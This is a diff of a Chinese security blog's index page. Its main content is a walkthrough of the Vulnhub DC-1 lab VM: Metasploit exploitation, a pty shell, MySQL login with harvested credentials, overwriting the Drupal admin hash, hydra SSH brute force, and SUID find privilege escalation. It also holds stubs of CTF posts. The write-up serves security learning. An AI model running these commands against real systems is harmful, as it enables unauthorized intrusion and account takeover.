+<p>（3）设置rhosts参数值（即靶机的ip地址）<code>set rhosts 192.168.19.140</code>，lhost参数值是kali的ip地址</p>
+<p>（4）run</p>
+<p><img src="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/12.png" alt="image-20220828235400264"></p>
+<p>打开的session连接到靶机，接下来我们继续反弹一个交互的shell</p>
+<p>（5）<strong>提权</strong>，获取交互模式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">## -c : 执行具体的代码</span><br><span class="line">##import ：导入语句</span><br><span class="line">##pty ： 终端（接口）</span><br><span class="line">##pty.spawn : 执行命令</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/13.png" alt="image-20220828235915643"></p>
+<p>（6）查看目录内容</p>
+<p>发现有<code>flag.txt</code>的存在</p>
+<p><img src="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/14.png" alt="image-20220829000938251"></p>
+<p><code>cat flag1.txt</code>:</p>
+<p><img src="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/15.png" alt="image-20220829001217165"></p>
+<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p>提示寻找配置文件，在目录中找可能存放配置文件的目录</p>
+<img src="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/16.png" alt="image-20220830223701706" style="zoom:67%;">
+
+<p>从图中可知，数据库是MySQL账号以及密码，接着进行登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t    ##登录mysql</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/17.png" alt="image-20220830224510915"></p>
+<p>数据库查询语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;  ##“；”一定要</span><br><span class="line">mysql&gt; use drupaldb;</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
+
+<p>数据库查询到的信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use drupaldb;</span><br><span class="line">use drupaldb;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+-----------------------------+</span><br><span class="line">| Tables_in_drupaldb          |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| actions                     |</span><br><span class="line">| authmap                     |</span><br><span class="line">| batch                       |</span><br><span class="line">| block                       |</span><br><span class="line">| block_custom                |</span><br><span class="line">| block_node_type             |</span><br><span class="line">| block_role                  |</span><br><span class="line">| blocked_ips                 |</span><br><span class="line">| cache                       |</span><br><span class="line">| cache_block                 |</span><br><span class="line">| cache_bootstrap             |</span><br><span class="line">| cache_field                 |</span><br><span class="line">| cache_filter                |</span><br><span class="line">| cache_form                  |</span><br><span class="line">| cache_image                 |</span><br><span class="line">| cache_menu                  |</span><br><span class="line">| cache_page                  |</span><br><span class="line">| cache_path                  |</span><br><span class="line">| cache_update                |</span><br><span class="line">| cache_views                 |</span><br><span class="line">| cache_views_data            |</span><br><span class="line">| comment                     |</span><br><span class="line">| ctools_css_cache            |</span><br><span class="line">| ctools_object_cache         |</span><br><span class="line">| date_format_locale          |</span><br><span class="line">| date_format_type            |</span><br><span class="line">| date_formats                |</span><br><span class="line">| field_config                |</span><br><span class="line">| field_config_instance       |</span><br><span class="line">| field_data_body             |</span><br><span class="line">| field_data_comment_body     |</span><br><span class="line">| field_data_field_image      |</span><br><span class="line">| field_data_field_tags       |</span><br><span class="line">| field_revision_body         |</span><br><span class="line">| field_revision_comment_body |</span><br><span class="line">| field_revision_field_image  |</span><br><span class="line">| field_revision_field_tags   |</span><br><span class="line">| file_managed                |</span><br><span class="line">| file_usage                  |</span><br><span class="line">| filter                      |</span><br><span class="line">| filter_format               |</span><br><span class="line">| flood                       |</span><br><span class="line">| history                     |</span><br><span class="line">| image_effects               |</span><br><span class="line">| image_styles                |</span><br><span class="line">| menu_custom                 |</span><br><span class="line">| menu_links                  |</span><br><span class="line">| menu_router                 |</span><br><span class="line">| node                        |</span><br><span class="line">| node_access                 |</span><br><span class="line">| node_comment_statistics     |</span><br><span class="line">| node_revision               |</span><br><span class="line">| node_type                   |</span><br><span class="line">| queue                       |</span><br><span class="line">| rdf_mapping                 |</span><br><span class="line">| registry                    |</span><br><span class="line">| registry_file               |</span><br><span class="line">| role                        |</span><br><span class="line">| role_permission             |</span><br><span class="line">| search_dataset              |</span><br><span class="line">| search_index                |</span><br><span class="line">| search_node_links           |</span><br><span class="line">| search_total                |</span><br><span class="line">| semaphore                   |</span><br><span class="line">| sequences                   |</span><br><span class="line">| sessions                    |</span><br><span class="line">| shortcut_set                |</span><br><span class="line">| shortcut_set_users          |</span><br><span class="line">| system                      |</span><br><span class="line">| taxonomy_index              |</span><br><span class="line">| taxonomy_term_data          |</span><br><span class="line">| taxonomy_term_hierarchy     |</span><br><span class="line">| taxonomy_vocabulary         |</span><br><span class="line">| url_alias                   |</span><br><span class="line">| users                       |</span><br><span class="line">| users_roles                 |</span><br><span class="line">| variable                    |</span><br><span class="line">| views_display               |</span><br><span class="line">| views_view                  |</span><br><span class="line">| watchdog                    |</span><br><span class="line">+-----------------------------+</span><br><span class="line">80 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p><code>select * from users;</code>结果</p>
+<p><img src="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/18.png" alt="image-20220831010655484"></p>
+<h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>密码password经过hash加密<code>$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR</code>，不能解密，那就将用Drupal有自带的加密脚本加密要密码明文放进去，在目录<code>/var/www/scripts/password-hash.sh</code>，将数据库中的admin用户的密码修改为”123456”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/scripts/password-hash.sh admin</span><br></pre></td></tr></table></figure>
+
+<p>得到密文：</p>
+<p><code>$S$DFbKYk3vunget5TzL9meWDcxJaSwn1AEY/2u/Iqxn3mIWqxRVfdv</code></p>
+<p>使用数据库语言更新admin的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set pass=&#x27;$S$DFbKYk3vunget5TzL9meWDcxJaSwn1AEY/2u/Iqxn3mIWqxRVfdv&#x27; where uid=1;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/19.png" alt="image-20221031172259666"></p>
+<p>登录，在Bashboard中找到flag3</p>
+<p><img src="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/20.png" alt="image-20221031194231067"></p>
+<h4 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h4><p>提醒需要特殊权限才能查找密码，需要”-exec”命令才能确定如何获取隐藏的内容</p>
+<p>“&#x2F;etc&#x2F;passwd”文件跟踪系统上的所有用户基础配置信息，包含了用户名，密码（在第二个字段，但在&#x2F;etc&#x2F;passwd中大多数设置为x，用户密码存储在&#x2F;etc&#x2F;shadow文件中），目录，GID，UID，登录shell等等</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">Debian-exim:x:101:104::/var/spool/exim4:/bin/false</span><br><span class="line">statd:x:102:65534::/var/lib/nfs:/bin/false</span><br><span class="line">messagebus:x:103:107::/var/run/dbus:/bin/false</span><br><span class="line">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>发现flag4.txt在&#x2F;home&#x2F;flag4目录下，但权限不够</p>
+<p><strong>方法一：</strong>对flag4进行爆破，协议是ssh</p>
+<p>（1）使用hydra工具（hydra是一种支持众多协议的爆破工具），详细使用方法查看<code>hydra -h</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.19.140</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/21.png" alt="image-20221031213123718"></p>
+<p>得到密码是orange</p>
+<p>（2）使用ssh协议连接并提权</p>
+<p><img src="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/22.png" alt="image-20221031213758844"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -name flag4.txt -exec /bin/bash -p \;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-Vulnhub渗透测试-AI-web1.0" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -744,211 +1227,6 @@
 
 
   
-    <article id="post-反序列化题目" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/12/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/" class="article-date">
-      <time datetime="2021-12-11T16:00:00.000Z" itemprop="datePublished">2021-12-12</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/">PHP反序列化题目</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <h2 id="PHP反序列化题目"><a href="#PHP反序列化题目" class="headerlink" title="PHP反序列化题目"></a>PHP反序列化题目</h2><h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p><img src="/2021/12/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/1.png"></p>
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/web%E5%9F%BA%E7%A1%80/">web基础</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">php反序列化</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a href="/2021/12/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/#more">阅读全文 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-MD5（）函数的漏洞总结" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/12/03/MD5%EF%BC%88%EF%BC%89%E5%87%BD%E6%95%B0%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="article-date">
-      <time datetime="2021-12-02T16:00:00.000Z" itemprop="datePublished">2021-12-03</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/03/MD5%EF%BC%88%EF%BC%89%E5%87%BD%E6%95%B0%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">web基础---MD5（）函数的漏洞</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <h2 id="MD5（）函数的漏洞总结"><a href="#MD5（）函数的漏洞总结" class="headerlink" title="MD5（）函数的漏洞总结"></a>MD5（）函数的漏洞总结</h2><h4 id="1、md5-pass-true"><a href="#1、md5-pass-true" class="headerlink" title="1、md5($pass,true)"></a>1、md5($pass,true)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br></pre></td></tr></table></figure>
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/web%E5%9F%BA%E7%A1%80/">web基础</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/md5/" rel="tag">md5</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%9F%BA%E7%A1%80/" rel="tag">web基础</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a href="/2021/12/03/MD5%EF%BC%88%EF%BC%89%E5%87%BD%E6%95%B0%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#more">阅读全文 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-Web渗透" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/18/Web%E6%B8%97%E9%80%8F/" class="article-date">
-      <time datetime="2021-09-18T07:54:17.000Z" itemprop="datePublished">2021-09-18</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/18/Web%E6%B8%97%E9%80%8F/">web渗透---信息收集方式</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <h2 id="web渗透—信息收集方式"><a href="#web渗透—信息收集方式" class="headerlink" title="web渗透—信息收集方式"></a>web渗透—信息收集方式</h2><p>Web架构安全分析</p>
-<h4 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="HTTP请求"></a>HTTP请求</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /admin_s3cr3t.php HTTP/1.1</span><br><span class="line">Host: web.jarvisoj.com:32792</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: admin=1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag">web渗透</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a href="/2021/09/18/Web%E6%B8%97%E9%80%8F/#more">阅读全文 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="extend next" rel="next" href="/archives/page/2/">Next &amp;raquo;</a>
@@ -959,7 +1237,7 @@
   <div class="outer">
     <div id="footer-info">
         <div class="footer-left">
-            &copy; 2022 krismile
+            &copy; 2023 krismile
         </div>
         <div class="footer-right">
             Powered by <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的静态博客框架">Hexo</a>, <a target="_blank" rel="noopener" href="https://pages.github.com/" title="GitHub Pages: Websites for you and your projects">GitHub</a> and theme <a href="https://github.com/MOxFIVE/M-Hexo-Blog" target="_blank" title="Building my Blog by Hexo & theme Yilia.">Yilia</a>
